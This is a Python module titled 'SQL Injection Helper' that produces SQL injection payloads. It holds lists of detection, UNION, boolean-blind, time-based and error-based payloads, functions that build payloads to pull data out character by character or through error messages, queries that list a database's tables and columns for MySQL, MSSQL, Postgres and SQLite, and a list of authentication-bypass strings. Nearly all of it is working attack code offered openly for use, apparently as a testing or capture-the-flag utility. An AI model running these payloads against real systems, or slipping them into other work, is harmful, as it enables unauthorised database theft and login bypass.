"""
SQL Injection Helper

Generate SQL injection payloads for various databases and techniques.
"""

from typing import List, Optional


def sqli_payloads(technique: str = "all") -> List[str]:
    """
    Get SQL injection payloads by technique.

    Args:
        technique: "detection", "union", "boolean", "time", "error", or "all"

    Returns:
        List of payloads
    """
    payloads = {
        "detection": [
            "'",
            "''",
            "\"",
            "\"\"",
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "\" OR \"1\"=\"1",
            "\" OR \"1\"=\"1\"--",
            "1' OR '1'='1",
            "1\" OR \"1\"=\"1",
            "' OR 1=1--",
            "\" OR 1=1--",
            "') OR ('1'='1",
            "')) OR (('1'='1",
            "1 OR 1=1",
            "1' OR 1=1--",
            "1\" OR 1=1--",
            "' OR ''='",
            "1' ORDER BY 1--",
            "1' ORDER BY 10--",
            "1' UNION SELECT NULL--",
        ],
        "union": [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,2,3,4--",
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION ALL SELECT NULL--",
            "' UNION ALL SELECT 1,2,3--",
            "0 UNION SELECT 1,2,3--",
            "-1 UNION SELECT 1,2,3--",
        ],
        "boolean": [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND 'a'='a",
            "' AND 'a'='b",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "' AND SUBSTRING(username,1,1)='a'--",
            "' AND (SELECT COUNT(*) FROM users)>0--",
        ],
        "time": [
            "' AND SLEEP(5)--",
            "' AND BENCHMARK(10000000,SHA1('test'))--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND pg_sleep(5)--",
            "1' AND SLEEP(5)--",
            "1'; WAITFOR DELAY '0:0:5'--",
        ],
        "error": [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND EXP(~(SELECT * FROM (SELECT VERSION())a))--",
        ],
    }

    if technique == "all":
        all_payloads = []
        for p in payloads.values():
            all_payloads.extend(p)
        return all_payloads

    return payloads.get(technique, [])


def union_payload(columns: int, position: int = 1, data: str = "@@version") -> str:
    """
    Generate UNION-based SQLi payload.

    Args:
        columns: Number of columns in the original query
        position: Column position to inject data (1-indexed)
        data: SQL expression to extract

    Returns:
        UNION payload string
    """
    parts = []
    for i in range(1, columns + 1):
        if i == position:
            parts.append(data)
        else:
            parts.append("NULL")

    return f"' UNION SELECT {','.join(parts)}--"


def boolean_payload(column: str, table: str, position: int, char: str) -> str:
    """
    Generate boolean-based blind SQLi payload.

    Args:
        column: Column name to extract
        table: Table name
        position: Character position (1-indexed)
        char: Character to test

    Returns:
        Boolean payload string
    """
    return f"' AND SUBSTRING((SELECT {column} FROM {table} LIMIT 1),{position},1)='{char}'--"


def time_payload(column: str, table: str, position: int, char: str,
                 delay: int = 5, dbms: str = "mysql") -> str:
    """
    Generate time-based blind SQLi payload.

    Args:
        column: Column name to extract
        table: Table name
        position: Character position (1-indexed)
        char: Character to test
        delay: Sleep delay in seconds
        dbms: Database type (mysql, mssql, postgres)

    Returns:
        Time-based payload string
    """
    sleep_funcs = {
        "mysql": f"SLEEP({delay})",
        "mssql": f"WAITFOR DELAY '0:0:{delay}'",
        "postgres": f"pg_sleep({delay})",
    }

    sleep = sleep_funcs.get(dbms, f"SLEEP({delay})")

    return f"' AND IF(SUBSTRING((SELECT {column} FROM {table} LIMIT 1),{position},1)='{char}',{sleep},0)--"


def error_payload(query: str, dbms: str = "mysql") -> str:
    """
    Generate error-based SQLi payload.

    Args:
        query: SQL query to execute
        dbms: Database type

    Returns:
        Error-based payload string
    """
    if dbms == "mysql":
        return f"' AND EXTRACTVALUE(1,CONCAT(0x7e,({query})))--"
    elif dbms == "mssql":
        return f"' AND 1=CONVERT(int,({query}))--"
    elif dbms == "postgres":
        return f"' AND CAST(({query}) AS int)--"

    return f"' AND EXTRACTVALUE(1,CONCAT(0x7e,({query})))--"


def dump_tables_payload(dbms: str = "mysql") -> str:
    """Get payload to dump table names."""
    queries = {
        "mysql": "SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()",
        "mssql": "SELECT STRING_AGG(name,',') FROM sysobjects WHERE xtype='U'",
        "postgres": "SELECT STRING_AGG(tablename,',') FROM pg_tables WHERE schemaname='public'",
        "sqlite": "SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table'",
    }
    return queries.get(dbms, queries["mysql"])


def dump_columns_payload(table: str, dbms: str = "mysql") -> str:
    """Get payload to dump column names."""
    queries = {
        "mysql": f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{table}'",
        "mssql": f"SELECT STRING_AGG(name,',') FROM syscolumns WHERE id=OBJECT_ID('{table}')",
        "postgres": f"SELECT STRING_AGG(column_name,',') FROM information_schema.columns WHERE table_name='{table}'",
    }
    return queries.get(dbms, queries["mysql"])


# Authentication bypass payloads
AUTH_BYPASS = [
    "admin'--",
    "admin'/*",
    "' OR 1=1--",
    "' OR '1'='1",
    "' OR ''='",
    "admin' OR '1'='1",
    "admin' OR '1'='1'--",
    "admin' OR '1'='1'/*",
    "admin'or 1=1 or ''='",
    "') OR ('1'='1",
    "') OR ('1'='1'--",
    "admin') OR ('1'='1",
    "admin')/*",
]


if __name__ == "__main__":
    print("Detection payloads:")
    for p in sqli_payloads("detection")[:5]:
        print(f"  {p}")

    print("\nUnion payload (5 columns, data in position 2):")
    print(f"  {union_payload(5, 2, 'database()')}")

    print("\nAuth bypass payloads:")
    for p in AUTH_BYPASS[:5]:
        print(f"  {p}")
